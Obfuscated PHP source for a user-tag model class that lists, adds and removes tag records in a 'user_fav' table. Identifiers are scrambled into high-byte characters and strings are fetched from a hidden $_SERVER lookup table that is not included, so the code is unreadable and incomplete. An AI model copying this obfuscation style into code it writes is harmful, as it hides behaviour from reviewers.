D³ÒÆÒ—‘: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\137\x66\141\166"; protected function cacheFunctionAlias($ª½ä®“Î) { $Ø»·æëÒ =& $_SERVER[¥ÙÌÜ¾ê]; return array($Ø»·æëÒ[1859] => array(USER_ID, $Ø»·æëÒ[1860])); } protected function listData() { $ô‚ıà¢à =& $_SERVER[¥ÙÌÜ¾ê]; $±ğ÷Ä† = array($ô‚ıà¢à[1572] => USER_ID, $ô‚ıà¢à[477] => array($ô‚ıà¢à[1863], 0)); $Íø§ÈÆ = $ô‚ıà¢à[1865]; $ˆşåÜìç = $this->field($Íø§ÈÆ)->where($±ğ÷Ä†)->order($ô‚ıà¢à[1866])->select(); return $ˆşåÜìç ? $ˆşåÜìç : array(); } protected function listByTag($á®¢Æ¦Ú) { } protected function addToTag($öÇóæùÅ, $„¾§æ˜¬) { $ä˜ñ³Æ =& $_SERVER[¥ÙÌÜ¾ê]; if (!Model($ä˜ñ³Æ[1999])->listData($„¾§æ˜¬) || !Model($ä˜ñ³Æ[825])->pathInfo($öÇóæùÅ)) { return !1; } $€ˆ´Ì¥ó = array($ä˜ñ³Æ[1572] => USER_ID, $ä˜ñ³Æ[477] => $„¾§æ˜¬, $ä˜ñ³Æ[416] => $öÇóæùÅ, $ä˜ñ³Æ[417] => $ä˜ñ³Æ[411], $ä˜ñ³Æ[415] => $ä˜ñ³Æ[33], $ä˜ñ³Æ[1753] => 0); if ($this->where($€ˆ´Ì¥ó)->find()) { return !1; } return $this->add($€ˆ´Ì¥ó); } protected function removeFromTag($îÇèÛ§, $üì‰…Ä) { $”€¢° =& $_SERVER[¥ÙÌÜ¾ê]; if (!Model($”€¢°[1999])->listData($üì‰…Ä)) { return !1; } if (is_array($îÇèÛ§)) { $îÇèÛ§ = array($”€¢°[7], $îÇèÛ§); } $—¹Û†ÎÕ = array($”€¢°[1572] => USER_ID, $”€¢°[477] => $üì‰…Ä, $”€¢°[417] => $”€¢°[411], $”€¢°[416] => $îÇèÛ§); return $this->where($—¹Û†ÎÕ)->delete(); } protected function removeByTag($êµ«ô†‹) { $ˆ½±Ñ =& $_SERVER[¥ÙÌÜ¾ê]; if (!$êµ«ô†‹) { return !1; } $œÚµÎ’ò = array($ˆ½±Ñ[1572] => USER_ID, $ˆ½±Ñ[477] => $êµ«ô†‹); return $this->where($œÚµÎ’ò)->delete(); } protected function removeBySource($ªŠÏøêÄ) { $¼®‹ì™ä =& $_SERVER[¥ÙÌÜ¾ê]; if (is_array($ªŠÏøêÄ)) { $ªŠÏøêÄ = array($¼®‹ì™ä[7], $ªŠÏøêÄ); } $¢¢ÙÏÙ¤ = array($¼®‹ì™ä[1572] => USER_ID, $¼®‹ì™ä[416] => $ªŠÏøêÄ, $¼®‹ì™ä[477] => array($¼®‹ì™ä[1010], 0)); return $this->where($¢¢ÙÏÙ¤)->delete(); } }